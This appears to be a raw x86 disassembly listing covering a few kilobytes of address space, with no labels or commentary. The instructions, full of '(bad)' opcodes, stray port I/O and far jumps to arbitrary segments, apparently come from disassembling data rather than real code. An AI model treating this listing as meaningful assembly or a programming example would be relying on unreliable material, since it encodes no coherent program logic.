  4169fa:	add    eax,0x7f64edbe
  4169ff:	mov    al,ds:0xf3ee5744
  416a04:	xchg   ebp,eax
  416a05:	aad    0x11
  416a07:	add    edx,DWORD PTR [edi]
  416a09:	(bad)  
  416a0a:	lock aas 
  416a0c:	jno    0x4169af
  416a0e:	out    0xc9,eax
  416a10:	pop    ds
  416a11:	rcl    DWORD PTR [edx+0x42],1
  416a14:	pop    edi
  416a15:	and    BYTE PTR [ebp+edi*2+0x65bf9bc1],bl
  416a1c:	aaa    
  416a1d:	popf   
  416a1e:	push   edi
  416a1f:	adc    eax,0x8eda68f2
  416a24:	sub    BYTE PTR [esi-0x21],ah
  416a27:	adc    esp,DWORD PTR [esi]
  416a29:	xor    al,0x69
  416a2b:	dec    edx
  416a2c:	sub    eax,0x253d8524
  416a31:	cmc    
  416a32:	adc    DWORD PTR es:0xfa10649c,eax
  416a39:	test   eax,0xf02c2cf4
  416a3e:	dec    edi
  416a3f:	fild   DWORD PTR [ebp-0x10]
  416a42:	xchg   esp,eax
  416a43:	adc    ecx,DWORD PTR [edx]
  416a45:	ins    BYTE PTR es:[edi],dx
  416a46:	(bad)  
  416a48:	(bad)  
  416a49:	mov    al,al
  416a4b:	dec    esi
  416a4c:	out    dx,eax
  416a4d:	sub    BYTE PTR ds:0x1a447fcf,0xc1
  416a54:	mov    WORD PTR [edx-0x5eff993e],?
  416a5a:	inc    eax
  416a5b:	sbb    DWORD PTR [ecx-0x75],esi
  416a5e:	sbb    DWORD PTR ds:0x4fa518ee,ebx
  416a64:	jo     0x416ac6
  416a66:	mov    al,0xa8
  416a68:	jmp    0xe750:0xfc6d86b2
  416a6f:	and    ch,BYTE PTR [ebx-0x5f05136d]
  416a75:	aad    0x89
  416a77:	add    BYTE PTR ds:0x87593e89,dl
  416a7d:	xchg   edi,eax
  416a7e:	(bad)  
  416a7f:	jnp    0x416a51
  416a81:	dec    ebp
  416a82:	xchg   ebp,eax
  416a83:	sub    edi,edi
  416a85:	rol    BYTE PTR [ebp+0x34],1
  416a88:	and    al,0xe1
  416a8a:	xchg   DWORD PTR [edx+eax*8-0x28],esp
  416a8e:	ins    DWORD PTR es:[edi],dx
  416a8f:	and    eax,0xe897fa96
  416a94:	xchg   esi,eax
  416a95:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416a96:	mov    edi,0xca4418c1
  416a9b:	(bad)  
  416a9c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416a9d:	and    eax,0xa7fd8be5
  416aa2:	out    dx,eax
  416aa3:	cmp    DWORD PTR [edi],esp
  416aa5:	fst    DWORD PTR [edx]
  416aa7:	push   0x24
  416aa9:	jmp    0x1d04:0x12c2307d
  416ab0:	inc    esp
  416ab1:	shr    BYTE PTR [edi+eiz*4],1
  416ab4:	jnp    0x416a3d
  416ab6:	sub    DWORD PTR [esi+esi*8-0x47],edi
  416aba:	outs   dx,DWORD PTR ds:[esi]
  416abb:	xchg   edi,ecx
  416abd:	pop    ecx
  416abe:	pop    es
  416abf:	stos   DWORD PTR es:[edi],eax
  416ac0:	es and al,0x48
  416ac3:	mov    esp,0x4aaf7bb
  416ac8:	daa    
  416ac9:	ret    
  416aca:	rdpmc  
  416acc:	lock push ebp
  416ace:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416acf:	mov    al,0x56
  416ad1:	fmul   st(2),st
  416ad3:	imul   ebp
  416ad5:	test   eax,0x352c01c3
  416ada:	test   DWORD PTR [edi],esi
  416adc:	repnz mov edi,0xb49bad9f
  416ae2:	cs cs aas 
  416ae5:	imul   edx,DWORD PTR ds:[ebp-0x65],0x2e
  416aea:	not    DWORD PTR [ecx+edx*1+0x73]
  416aee:	push   es
  416aef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416af0:	sbb    DWORD PTR [edi],ebp
  416af2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416af3:	outs   dx,BYTE PTR ds:[esi]
  416af4:	jge    0x416b35
  416af6:	cwde   
  416af7:	cmp    eax,0x8042401d
  416afc:	and    cl,ch
  416afe:	in     eax,0xb4
  416b00:	les    edi,FWORD PTR [ebx+0x280a7701]
  416b06:	or     al,0xaa
  416b08:	fdivr  DWORD PTR fs:[edx+0x26281d26]
  416b0f:	jbe    0x416ace
  416b11:	mov    ebx,0x63689ad5
  416b16:	xchg   esp,eax
  416b17:	xchg   ebx,eax
  416b18:	sar    DWORD PTR [ebx+0x60],0xbe
  416b1c:	pop    esp
  416b1d:	xor    BYTE PTR [eax+eax*4+0x30],al
  416b21:	int3   
  416b22:	js     0x416b9e
  416b24:	xor    BYTE PTR [ebx],al
  416b26:	js     0x416b2e
  416b28:	es jns 0x416b32
  416b2b:	push   0x37
  416b2d:	sbb    eax,0x620e2a
  416b32:	fldenv [eax+0x1a883f06]
  416b38:	mov    dh,bl
  416b3a:	cmp    DWORD PTR [edi-0x5bbcec83],ebx
  416b40:	pusha  
  416b41:	adc    bh,BYTE PTR [esi-0x7d]
  416b44:	xchg   DWORD PTR [edx-0x46],esi
  416b47:	jns    0x416b59
  416b49:	jb     0x416bae
  416b4b:	add    ecx,DWORD PTR [edx+0x53]
  416b4e:	dec    ebx
  416b4f:	jg     0x416b5f
  416b51:	or     bh,BYTE PTR [ebx-0x68b68a7d]
  416b57:	mov    ch,0x5
  416b59:	fwait
  416b5a:	out    0xcf,al
  416b5c:	adc    BYTE PTR [ebp-0x1dd81dbd],bh
  416b62:	(bad)  
  416b63:	and    edi,0x34a6dc4a
  416b69:	(bad)
  416b6c:	mov    ebx,0x47366a73
  416b71:	sub    ch,BYTE PTR cs:[esp+edx*1]
  416b75:	not    BYTE PTR [ecx]
  416b77:	pop    ebp
  416b78:	daa    
  416b79:	fidivr WORD PTR [esp+eax*2+0x10]
  416b7d:	pop    esi
  416b7e:	push   ecx
  416b7f:	cmp    dl,BYTE PTR [edx+0x63]
  416b82:	js     0x416b66
  416b84:	(bad)  
  416b85:	cmp    esi,ebx
  416b87:	xchg   bl,ch
  416b89:	mov    ebp,0x5f4f36bc
  416b8e:	jnp    0x416baf
  416b90:	xor    DWORD PTR [ebp-0x1291722e],eax
  416b96:	bsr    eax,DWORD PTR [ecx+ebx*1-0x2117f8af]
  416b9e:	aas    
  416b9f:	mov    esi,0x88e2d59d
  416ba4:	dec    esi
  416ba5:	dec    ebp
  416ba6:	js     0x416c1e
  416ba8:	add    eax,0x1007eb
  416bad:	aad    0x41
  416baf:	mov    al,ds:0x8fee0123
  416bb4:	sbb    BYTE PTR [ebx+0x2f],cl
  416bb7:	in     eax,0x7d
  416bb9:	or     eax,0x8ccbbb2b
  416bbe:	jae    0x416bb2
  416bc0:	xchg   esp,eax
  416bc1:	dec    DWORD PTR [edx+0xdaaefd4]
  416bc7:	sub    esi,esi
  416bc9:	jae    0x416b4c
  416bcb:	cmp    BYTE PTR [esi+0x6b],bl
  416bce:	xor    al,0xa5
  416bd0:	mov    esp,0xd130d601
  416bd5:	or     edx,edi
  416bd7:	repz test dh,cl
  416bda:	and    al,0x1e
  416bdc:	pop    esp
  416bdd:	mov    gs,WORD PTR [edi+0x7bc2d5d2]
  416be3:	mov    esi,0x54cd483e
  416be8:	test   DWORD PTR [ebx],0x8b85fbef
  416bee:	or     eax,0xc50c43c1
  416bf3:	add    DWORD PTR [ebx],edi
  416bf5:	mov    al,BYTE PTR [esi]
  416bf7:	mov    ebp,0x321b4e0f
  416bfc:	pushf  
  416bfd:	xor    ebp,DWORD PTR [esi+ecx*2]
  416c00:	icebp  
  416c01:	into   
  416c02:	inc    ebx
  416c03:	mov    edx,0x22fb795c
  416c08:	or     ebp,edx
  416c0a:	jmp    0x5c2:0xd015c890
  416c11:	or     al,0xa1
  416c13:	scas   eax,DWORD PTR es:[edi]
  416c14:	adc    al,0x8b
  416c16:	xor    al,0x63
  416c18:	mov    esp,0x86b6cfa
  416c1d:	push   ebx
  416c1e:	inc    esi
  416c1f:	test   DWORD PTR es:[esi-0x2998d3d],edx
  416c26:	sbb    DWORD PTR [ebp+0x5b862518],esi
  416c2c:	ss nop
  416c2e:	push   esp
  416c2f:	mov    edi,0x2b2599a7
  416c34:	out    0x5a,eax
  416c36:	aad    0x3b
  416c38:	out    dx,eax
  416c39:	cwde   
  416c3a:	clc    
  416c3b:	(bad)  
  416c3c:	sub    ch,BYTE PTR fs:[edx+edi*2-0x1d8a1b4f]
  416c44:	inc    eax
  416c45:	fisub  DWORD PTR [ebp-0x3f43c069]
  416c4b:	bound  ebp,QWORD PTR gs:[ebp-0xb]
  416c4f:	inc    ecx
  416c50:	adc    BYTE PTR [ecx-0x19],0x56
  416c54:	or     ah,0x83
  416c57:	and    esp,DWORD PTR [ecx+edi*2-0x2b]
  416c5b:	adc    BYTE PTR [edx],dl
  416c5d:	retf   0xfff1
  416c60:	and    DWORD PTR [ecx-0x102fcc86],0x32f973c5
  416c6a:	xchg   esp,eax
  416c6b:	in     eax,dx
  416c6c:	xchg   BYTE PTR [ecx+0x61],ch
  416c6f:	imul   esi,DWORD PTR [edx],0xffffffa2
  416c72:	imul   edx,DWORD PTR [ebp+ebp*1+0x5e87fa30],0x11
  416c7a:	mov    ds:0x57ec6a36,al
  416c7f:	mov    dh,0x25
  416c81:	lock push 0xfffffffd
  416c84:	mov    al,0x1e
  416c86:	xchg   ecx,eax
  416c87:	sar    DWORD PTR [ecx+0x1],1
  416c8a:	pushf  
  416c8b:	cdq    
  416c8c:	leave  
  416c8d:	lahf   
  416c8e:	inc    edx
  416c8f:	pop    ebx
  416c90:	sub    eax,0xa7a046da
  416c95:	fadd   QWORD PTR [ecx]
  416c97:	icebp  
  416c98:	push   es
  416c99:	push   esi
  416c9a:	jae    0x416cc9
  416c9c:	mov    ebp,0x6d999ba3
  416ca1:	fld    DWORD PTR ds:0x437efd6b
  416ca7:	call   0xac3f:0x983caff3
  416cae:	push   esp
  416caf:	test   BYTE PTR [ebx],bl
  416cb1:	mov    fs,WORD PTR [edi+0x6ae350a5]
  416cb7:	push   eax
  416cb8:	mov    esi,0x39c82fab
  416cbd:	adc    BYTE PTR [ebp+0x6c],dh
  416cc0:	push   ds
  416cc1:	cmp    DWORD PTR [ebp-0x3add8625],ebp
  416cc7:	xchg   ebx,eax
  416cc8:	call   0x6ca6:0xcfcdce4f
  416ccf:	inc    eax
  416cd0:	adc    BYTE PTR [ebx],ch
  416cd2:	jecxz  0x416cc6
  416cd4:	jae    0x416d1b
  416cd6:	leave  
  416cd7:	fidiv  DWORD PTR [eax-0x7a31917]
  416cdd:	popa   
  416cde:	mov    ebx,0xaba24c79
  416ce3:	push   esp
  416ce4:	hlt    
  416ce5:	adc    ch,BYTE PTR [esi-0x54303f1e]
  416ceb:	xor    dl,ch
  416ced:	nop
  416cee:	sbb    BYTE PTR [edx],0xb5
  416cf1:	and    BYTE PTR [ecx+0x745dedc7],cl
  416cf7:	pop    ecx
  416cf8:	jb     0x416d04
  416cfa:	xor    ah,ah
  416cfc:	mov    BYTE PTR [ebp-0x43],0x22
  416d00:	and    DWORD PTR [si+0x3a70],ebx
  416d05:	in     eax,dx
  416d06:	adc    dl,al
  416d08:	xchg   esi,eax
  416d09:	dec    esp
  416d0a:	fidiv  WORD PTR [edx]
  416d0c:	sub    BYTE PTR [eax],0xaa
  416d0f:	clc    
  416d10:	daa    
  416d11:	sbb    DWORD PTR [ebx-0x5],eax
  416d14:	hlt    
  416d15:	and    eax,0xadc6678f
  416d1a:	mov    ebp,0x1e8b1624
  416d1f:	push   esi
  416d20:	jg     0x416d08
  416d22:	push   cs
  416d23:	xor    al,0x4d
  416d25:	fiadd  DWORD PTR [edi+ecx*8]
  416d28:	sahf   
  416d29:	sbb    edx,0x47543451
  416d2f:	(bad)  
  416d30:	pop    edx
  416d31:	stos   DWORD PTR es:[edi],eax
  416d32:	add    eax,DWORD PTR [ebp+0x16]
  416d35:	daa    
  416d36:	sbb    BYTE PTR [ecx],0xb6
  416d39:	add    eax,0x44ee47d1
  416d3e:	fwait
  416d3f:	cli    
  416d40:	aam    0x70
  416d42:	xchg   esp,eax
  416d43:	imul   ebp,DWORD PTR [esi],0x25120760
  416d49:	adc    dh,BYTE PTR [esi+0x21]
  416d4c:	pop    esp
  416d4d:	push   edi
  416d4e:	imul   edx,DWORD PTR [eax+ebp*2],0x9938c711
  416d55:	in     al,0xd6
  416d57:	xchg   ecx,eax
  416d58:	xchg   esi,eax
  416d59:	pusha  
  416d5a:	js     0x416d5a
  416d5c:	in     al,0xd
  416d5e:	jbe    0x416d25
  416d60:	popf   
  416d61:	jnp    0x416d59
  416d63:	outs   dx,BYTE PTR fs:[esi]
  416d65:	dec    esp
  416d66:	mov    edx,0xd344d4ff
  416d6b:	loopne 0x416da6
  416d6d:	pop    ss
  416d6e:	xchg   DWORD PTR [edx+0xea3fcc7],ecx
  416d74:	pop    esp
  416d75:	sbb    al,0xf8
  416d77:	adc    BYTE PTR [eax],cl
  416d79:	mov    edi,0x69d674a
  416d7e:	std    
  416d7f:	pop    ebx
  416d80:	mov    bl,0x81
  416d83:	sbb    esp,esp
  416d85:	(bad)  
  416d86:	and    bh,ah
  416d88:	in     eax,dx
  416d89:	push   ecx
  416d8a:	xor    al,0x49
  416d8c:	in     al,dx
  416d8d:	add    bh,al
  416d8f:	sub    DWORD PTR [ebx-0x3d],eax
  416d92:	gs mov edx,0xfaf4b365
  416d98:	sub    DWORD PTR [ebx],ecx
  416d9a:	mov    eax,0x91071466
  416d9f:	cmp    ah,BYTE PTR [eax+0x68dfe1b4]
  416da5:	mov    esi,0xe4adb5ec
  416daa:	inc    esi
  416dab:	mov    eax,0x59fec9d5
  416db0:	cld    
  416db1:	das    
  416db2:	test   eax,0x545b1480
  416db7:	mov    WORD PTR [ecx-0x111c2364],es
  416dbd:	hlt    
  416dbe:	inc    edx
  416dbf:	mov    dl,0x55
  416dc1:	shl    ebp,0x6f
  416dc4:	hlt    
  416dc5:	lock sub DWORD PTR [eax-0x28d6b52b],eax
  416dcc:	call   0xc620d9f0
  416dd1:	push   esp
  416dd2:	pop    ecx
  416dd3:	les    edi,FWORD PTR [ebp-0x48ddb49c]
  416dd9:	sbb    eax,DWORD PTR [ebx+0x46556fd3]
  416ddf:	(bad)  
  416de0:	leave  
  416de1:	xor    eax,0xa6e365cc
  416de6:	aad    0xc9
  416de8:	retf   0x81f5
  416deb:	pop    edi
  416dec:	inc    ebx
  416ded:	push   ebx
  416dee:	adc    eax,0x588a9606
  416df3:	inc    ecx
  416df4:	ins    DWORD PTR es:[edi],dx
  416df5:	das    
  416df6:	mov    dl,0xde
  416df8:	pop    esi
  416df9:	fsubr  st(2),st
  416dfb:	add    al,0x98
  416dfd:	xchg   esi,eax
  416dfe:	loop   0x416e4e
  416e00:	jns    0x416e12
  416e02:	inc    eax
  416e03:	xor    BYTE PTR [edx],ah
  416e05:	fisubr WORD PTR [edx]
  416e07:	sub    BYTE PTR [edi-0x35],ch
  416e0a:	xor    eax,0xd6b23c67
  416e0f:	sbb    dh,BYTE PTR ds:0x1182ba2c
  416e15:	stos   BYTE PTR es:[edi],al
  416e16:	xchg   edi,eax
  416e17:	xchg   ebp,eax
  416e18:	shl    BYTE PTR [edi],0xca
  416e1b:	mov    cl,0x23
  416e1d:	enter  0x4982,0x89
  416e21:	sub    eax,0x8e885cc5
  416e26:	mov    eax,ds:0x8a0abd63
  416e2b:	sar    BYTE PTR [ebp-0xe],1
  416e2e:	or     al,0x18
  416e30:	sub    al,0x29
  416e32:	fimul  DWORD PTR [ebp+0x7f]
  416e35:	and    BYTE PTR [edi-0x315b7727],cl
  416e3b:	call   0xc720:0xff0bffab
  416e42:	push   0xb86b8dd1
  416e47:	jns    0x416e58
  416e49:	bts    DWORD PTR [edx+0x5b],edi
  416e4d:	jle    0x416ec3
  416e4f:	int3   
  416e50:	in     al,0xa4
  416e52:	dec    esp
  416e53:	sub    DWORD PTR [eax+esi*2],eax
  416e56:	xchg   ebp,eax
  416e57:	mov    ecx,0xbb9c09c7
  416e5c:	mov    ds:0x33fecfc4,al
  416e61:	sahf   
  416e62:	push   ecx
  416e63:	pop    edx
  416e64:	dec    esp
  416e65:	jg     0x416e66
  416e67:	jbe    0x416e9b
  416e69:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416e6a:	addr16 and eax,0xa6142e7e
  416e70:	out    dx,eax
  416e71:	es and eax,0xaa6a1043
  416e77:	test   BYTE PTR [edi+0x2cbee8de],cl
  416e7d:	add    al,0x23
  416e7f:	fnstsw WORD PTR [esi+0x42f511e6]
  416e85:	jl     0x416e98
  416e87:	das    
  416e88:	jnp    0xe41058b1
  416e8e:	std    
  416e8f:	(bad)  
  416e90:	je     0x416e97
  416e92:	mov    edx,0xea81d262
  416e97:	push   ds
  416e98:	pop    ss
  416e99:	fisttp QWORD PTR [edi+0xc5d9e5c]
  416e9f:	pop    esi
  416ea0:	pop    edx
  416ea1:	ficomp WORD PTR [esi-0x2121f03d]
  416ea7:	inc    esp
  416ea8:	mov    esi,ebx
  416eaa:	mov    ds:0x9d85d0c0,al
  416eaf:	xor    ch,BYTE PTR [edi-0x7afdc78d]
  416eb5:	or     eax,0x309d685a
  416eba:	xor    BYTE PTR [ecx-0x295fd292],al
  416ec0:	mov    edi,0x9e2019d2
  416ec5:	(bad)  
  416ec6:	ror    DWORD PTR [edx],1
  416ec8:	pop    esi
  416ec9:	js     0x416f2c
  416ecb:	test   DWORD PTR [ebx-0x304f9b0f],esi
  416ed1:	out    dx,eax
  416ed2:	ror    BYTE PTR [edx],0x70
  416ed5:	inc    edi
  416ed6:	push   eax
  416ed7:	xchg   DWORD PTR [esi+0x20],eax
  416eda:	mov    ah,0x1d
  416edc:	dec    edi
  416edd:	push   esp
  416ede:	(bad)  
  416edf:	cmp    eax,0xcfae39e5
  416ee4:	pop    eax
  416ee5:	mov    DWORD PTR [edi+0x7],ebx
  416ee8:	std    
  416ee9:	in     al,0xcc
  416eeb:	test   BYTE PTR [ebp+0x6],ch
  416eee:	out    0xc1,al
  416ef0:	pop    ecx
  416ef1:	adc    DWORD PTR [esi],0xffffffb0
  416ef4:	or     DWORD PTR [ebp+0x69],edx
  416ef7:	xor    al,0xf8
  416ef9:	stos   BYTE PTR es:[edi],al
  416efa:	inc    edi
  416efb:	mov    ebp,0xebe772d3
  416f00:	sub    DWORD PTR [esi+eiz*2],edi
  416f03:	fmul   st,st(3)
  416f05:	dec    ebx
  416f06:	and    eax,0x1a5b9b3f
  416f0b:	jg     0x416f36
  416f0d:	jle    0x416f33
  416f0f:	(bad)  
  416f10:	rol    BYTE PTR [esp+edi*8+0x18],1
  416f14:	bnd jb 0x416e9c
  416f17:	xchg   ebx,eax
  416f18:	stos   BYTE PTR es:[edi],al
  416f19:	out    dx,eax
  416f1a:	jmp    0x416ef2
  416f1c:	or     al,0x1
  416f1e:	sbb    eax,0x3021f636
  416f23:	xor    DWORD PTR [ecx-0x35],0x56162e63
  416f2a:	mov    edx,esp
  416f2c:	pop    ebp
  416f2d:	jg     0x416f46
  416f2f:	add    dl,BYTE PTR [ecx-0x49]
  416f32:	ins    DWORD PTR es:[edi],dx
  416f33:	add    ebx,DWORD PTR [ecx+eax*1]
  416f36:	ins    BYTE PTR es:[edi],dx
  416f37:	dec    eax
  416f38:	xor    ecx,DWORD PTR [eax-0x2ae56ff1]
  416f3e:	mov    DWORD PTR [esi+0x5e],ecx
  416f41:	push   0x65
  416f43:	mov    bh,0xe1
  416f45:	jl     0x416f63
  416f47:	test   al,0xb8
  416f49:	(bad)  
  416f4c:	jno    0x416fbe
  416f4e:	add    DWORD PTR [esi-0x40],ecx
  416f51:	push   es
  416f52:	jae    0x416f63
  416f54:	sbb    cl,dl
  416f56:	imul   edi,DWORD PTR [esi],0x6da0a536
  416f5c:	pop    ds
  416f5d:	lods   al,BYTE PTR ds:[esi]
  416f5e:	jecxz  0x416f74
  416f60:	push   esp
  416f61:	lds    edi,FWORD PTR [eax]
  416f63:	into   
  416f64:	jge    0x416f83
  416f66:	add    eax,0xa26e92ae
  416f6b:	aaa    
  416f6c:	enter  0xbc9f,0xb3
  416f70:	sti    
  416f71:	rol    DWORD PTR [ebp+0x20],cl
  416f74:	inc    ebx
  416f75:	mov    dl,0x29
  416f77:	dec    edx
  416f78:	pop    ds
  416f79:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416f7a:	leave  
  416f7b:	scas   al,BYTE PTR es:[edi]
  416f7c:	(bad)  
  416f7e:	(bad)  
  416f7f:	pop    ss
  416f80:	out    0xcb,eax
  416f82:	ficomp WORD PTR [eax+0x3b]
  416f85:	mov    dh,0x63
  416f87:	push   0x64
  416f89:	in     al,0x16
  416f8b:	imul   ebp,DWORD PTR [ebx-0x3bb0bdcd],0x4c7eb904
  416f95:	xor    dl,ah
  416f97:	lock sbb BYTE PTR [ebx+0x20b91215],dh
  416f9e:	retf   0xc483
  416fa1:	and    BYTE PTR [ecx-0x26c61db8],dl
  416fa7:	cmp    al,0xaa
  416fa9:	das    
  416faa:	add    cl,al
  416fac:	mov    edx,0xbe96bfbd
  416fb1:	enter  0xc03,0x52
  416fb5:	cld    
  416fb6:	loope  0x416f78
  416fb8:	mov    ds:0xab95f66e,eax
  416fbd:	scas   eax,DWORD PTR es:[edi]
  416fbe:	enter  0x30bc,0x7a
  416fc2:	arpl   ax,dx
  416fc4:	xchg   ebx,eax
  416fc5:	add    eax,0x692f24f1
  416fca:	xchg   BYTE PTR [ebx-0x132eb283],cl
  416fd0:	ret    0x584c
  416fd3:	arpl   WORD PTR [ebx+0x3d66ef23],dx
  416fd9:	jmp    0x417027
  416fdb:	(bad)  
  416fdd:	mov    eax,0x79fcd0c7
  416fe2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416fe3:	jg     0x41700d
  416fe5:	jne    0x416ffc
  416fe7:	std    
  416fe8:	hlt    
  416fe9:	push   0xea87777c
  416fee:	pushw  ss
  416ff0:	inc    ebx
  416ff1:	(bad)  
  416ff2:	fstp   TBYTE PTR [ecx]
  416ff4:	add    al,0xb6
  416ff6:	fisttp WORD PTR [edx-0x5b4256ff]
  416ffc:	int3   
  416ffd:	lods   eax,DWORD PTR ds:[esi]
  416ffe:	(bad)  
  417000:	popa   
  417001:	cmp    eax,0x28dede68
  417006:	adc    BYTE PTR [ebp+0x3c03142b],bh
  41700c:	or     al,0x8
  41700e:	push   edi
  41700f:	add    eax,0x91564986
  417014:	xchg   ebp,eax
  417015:	sub    al,0x68
  417017:	sbb    BYTE PTR ds:0xbb0ccb66,dl
  41701d:	jo     0x417031
  41701f:	mov    WORD PTR [ecx],?
  417021:	push   ds
  417022:	in     al,dx
  417023:	iret   
  417024:	jno    0x417071
  417026:	mov    DWORD PTR [ebx+0x4e],esp
  417029:	cmp    al,0x34
  41702b:	das    
  41702c:	pop    ebp
  41702d:	add    al,0xbf
  41702f:	(bad)  
  417030:	in     al,0xf0
  417032:	int    0x14
  417034:	mov    BYTE PTR ds:0x33b56afc,ch
  41703a:	xchg   edi,eax
  41703b:	fistp  QWORD PTR [ebx+ebx*2+0x23]
  41703f:	mov    al,ds:0x6a387d33
  417044:	shr    DWORD PTR [edi+ecx*4+0x39],0x51
  417049:	ds stos DWORD PTR es:[edi],eax
  41704b:	dec    eax
  41704c:	sbb    eax,0x69a68489
  417051:	cs xor dl,dh
  417054:	dec    ecx
  417055:	cmp    ebp,DWORD PTR [esi+0x19]
  417058:	sbb    bh,BYTE PTR [ecx+0x2c]
  41705b:	aas    
  41705c:	dec    edi
  41705d:	inc    esi
  41705e:	scas   eax,DWORD PTR es:[edi]
  41705f:	mov    ds:0x2fd269b4,eax
  417064:	or     eax,0xe40675d3
  417069:	iret   
  41706a:	sub    eax,0x9d20ea23
  41706f:	dec    eax
  417070:	cmovge edx,DWORD PTR [edi]
  417073:	sbb    DWORD PTR [edi],0x49
  417076:	mov    cl,0xa5
  417078:	cmp    al,0x31
  41707a:	arpl   WORD PTR [ebp-0x7d92ebdc],sp
  417080:	bound  ecx,QWORD PTR [ecx]
  417082:	add    eax,0xd3b6341c
  417087:	mov    eax,ds:0x73986530
  41708c:	rcr    DWORD PTR [esi],0xa9
  41708f:	jbe    0x417061
  417091:	ret    0x6893
  417094:	in     eax,0xd0
  417096:	xor    DWORD PTR [ebp+0x1c70d415],esi
  41709c:	cmp    eax,0x67b7d18e
  4170a1:	daa    
  4170a2:	shld   DWORD PTR [esi-0x12],esp,0xb5
  4170a7:	xchg   ecx,eax
  4170a8:	mov    dh,0xaa
  4170aa:	jecxz  0x41707b
  4170ac:	test   ecx,ebx
  4170ae:	out    0xf7,al
  4170b0:	mov    ah,0xe7
  4170b2:	cmp    cl,BYTE PTR [eax+0x9]
  4170b5:	out    dx,eax
  4170b6:	(bad)  
  4170b7:	mov    eax,0xf957dc7
  4170bc:	mov    esp,DWORD PTR [ebp-0x14]
  4170bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4170c0:	cmp    esp,DWORD PTR ds:0x572ba35f
  4170c6:	mov    edi,0x69b0355
  4170cb:	adc    eax,0x201a6ff9
  4170d0:	pop    ebx
  4170d1:	xchg   ebx,eax
  4170d2:	cld    
  4170d3:	lahf   
  4170d4:	sar    BYTE PTR [ebp-0x6e],cl
  4170d7:	pop    edx
  4170d8:	and    cl,bl
  4170da:	mov    eax,ds:0x11b99fa5
  4170df:	push   es
  4170e0:	and    eax,0xaaa618a1
  4170e5:	fbld   TBYTE PTR [edx]
  4170e7:	(bad)  
  4170e8:	out    dx,al
  4170e9:	mov    eax,0xf2e85ca0
  4170ee:	xchg   DWORD PTR [eax+0x79],ecx
  4170f1:	cmp    al,BYTE PTR [edi+0x741d6947]
  4170f7:	mov    ebx,0x293876ec
  4170fc:	ins    BYTE PTR es:[edi],dx
  4170fd:	and    DWORD PTR [edi+0x69],edx
  417100:	test   ch,0xf3
  417103:	sti    
  417104:	js     0x41708e
  417106:	inc    edi
  417107:	pop    esp
  417108:	sbb    BYTE PTR [esi],dl
  41710a:	fiadd  DWORD PTR [edi]
  41710c:	jae    0x41715c
  41710e:	ficom  WORD PTR [esi+0x63555767]
  417114:	push   ds
  417115:	add    eax,0xf18b8acc
  41711a:	and    eax,0x57752775
  41711f:	icebp  
  417120:	push   es
  417121:	test   BYTE PTR [ecx+0x5ed709a1],bl
  417127:	jne    0x4170f9
  417129:	add    dh,BYTE PTR [ebx]
  41712b:	push   esp
  41712c:	and    al,0x93
  41712e:	pop    ebp
  41712f:	addr16 mov cl,0xc5
  417132:	jecxz  0x417121
  417134:	pushf  
  417135:	push   ds
  417136:	dec    esp
  417137:	sbb    ch,BYTE PTR [ebp+ecx*2+0x70e4be48]
  41713e:	mov    bl,0x24
  417140:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417141:	adc    eax,0x97bcd7e4
  417146:	leave  
  417147:	or     BYTE PTR [edi+0x66],bl
  41714a:	call   0xa4428207
  41714f:	cwde   
  417150:	inc    edx
  417151:	daa    
  417152:	clc    
  417153:	or     edi,ebx
  417155:	gs jle 0x417185
  417158:	shr    BYTE PTR [edx],cl
  41715a:	mov    bl,0x2d
  41715c:	or     BYTE PTR [ecx+0x22f687fe],bl
  417162:	out    0xdf,eax
  417164:	rcr    BYTE PTR [ebp-0x3184eceb],cl
  41716a:	add    ecx,ecx
  41716c:	stos   BYTE PTR es:[edi],al
  41716d:	shl    BYTE PTR [ecx],cl
  41716f:	inc    ebp
  417170:	into   
  417171:	adc    al,0x2f
  417173:	(bad)  
  417174:	or     ebp,DWORD PTR [edi+0x1]
  417177:	mov    bl,0x23
  417179:	and    BYTE PTR [edx+0x479fa7fc],ch
  41717f:	imul   DWORD PTR [eax-0x7b]
  417182:	loop   0x417137
  417184:	icebp  
  417185:	dec    ebp
  417186:	call   0x84ecd50a
  41718b:	in     eax,dx
  41718c:	pop    esp
  41718d:	cmp    edx,DWORD PTR [eax]
  41718f:	cmp    al,0xe0
  417191:	cmp    bh,cl
  417193:	add    edi,DWORD PTR [ebp-0x56686d53]
  417199:	push   0x297df7a9
  41719e:	dec    esp
  41719f:	xor    eax,0xd443b243
  4171a4:	xlat   BYTE PTR ds:[ebx]
  4171a5:	mov    esi,0x1887e7ad
  4171aa:	rcr    DWORD PTR [eax-0x7d72bbcd],cl
  4171b0:	ret    
  4171b1:	xor    ecx,0x4f
  4171b4:	xor    al,0x6
  4171b6:	adc    BYTE PTR [esi-0x4],bl
  4171b9:	xchg   ecx,eax
  4171ba:	out    0xc3,eax
  4171bc:	fistp  WORD PTR [eax]
  4171be:	mov    bl,0xd1
  4171c0:	cmp    DWORD PTR [esi+edi*4+0x74940b3b],eax
  4171c7:	adc    DWORD PTR [esi+0x1c5fc1a1],ebx
  4171cd:	sub    eax,0x6097e2e3
  4171d2:	outs   dx,BYTE PTR ds:[esi]
  4171d3:	mov    esp,0x91bf35d9
  4171d8:	jnp    0x4171d5
  4171da:	adc    DWORD PTR [ebx],eax
  4171dc:	mov    dl,0x1e
  4171de:	cwde   
  4171df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4171e0:	jle    0x4171cd
  4171e2:	ja     0x41724c
  4171e4:	(bad)  
  4171e5:	fsubrp st(6),st
  4171e7:	hlt    
  4171e8:	leave  
  4171e9:	les    ebx,FWORD PTR [edx]
  4171eb:	bound  ebp,QWORD PTR [eax]
  4171ed:	imul   DWORD PTR [edi+0x6f]
  4171f0:	push   edi
  4171f1:	les    esi,FWORD PTR [eax]
  4171f3:	aad    0xfb
  4171f5:	add    edx,eax
  4171f7:	xchg   esi,eax
  4171f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
